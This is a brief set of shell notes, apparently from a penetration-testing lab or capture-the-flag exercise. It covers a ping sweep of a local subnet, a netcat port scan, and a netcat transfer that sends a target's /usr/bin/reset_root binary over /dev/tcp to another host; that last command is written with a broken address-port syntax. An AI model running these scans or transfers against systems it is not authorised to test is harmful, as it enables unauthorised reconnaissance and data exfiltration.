# check ping
for host in {1..154}; do ping -c1 192.168.1.$host | grep -B1 "1 received" | grep "statistics" | cut -d " " -f2; done | tee hosts.txt
# check port 
nc -zv -w 1 <host> 20-1023
# transfer file via netcat
nc -lvnp 3333 > reset_root
cat /usr/bin/reset_root > /dev/tcp/192.168.10.10 3333
